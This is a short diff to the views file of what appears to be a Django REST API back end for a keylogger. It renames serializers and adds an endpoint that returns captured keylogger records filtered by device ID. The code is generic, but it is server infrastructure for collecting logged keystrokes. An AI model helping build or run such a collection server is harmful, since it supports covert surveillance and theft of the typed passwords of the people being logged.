@@ -9,9 +9,9 @@ from .models import *
 from .serializers import *
 
 
-class GetDataWithTime(APIView):
+class GetAllData(APIView):
     def get(self, request, format=None):
-        serializer = KeyloggerDataSerializer(KeyloggerData.objects.all(), many=True)
+        serializer = GetDataSerializer(KeyloggerData.objects.all(), many=True)
         return Response(serializer.data)
 
 
@@ -20,5 +20,10 @@ class CreateId(APIView):
     def get(self, request):
         new = KeyloggerID()
         new.save()
-        serializer = KeyloggerIDSerializer(new)
+        serializer = GetIDSerializer(new)
+        return Response(serializer.data)
+
+class GetDataById(APIView):
+    def get(self, request, pk):
+        serializer = GetDataSerializer(KeyloggerData.objects.filter(keylogger_ref = pk), many=True)
         return Response(serializer.data)
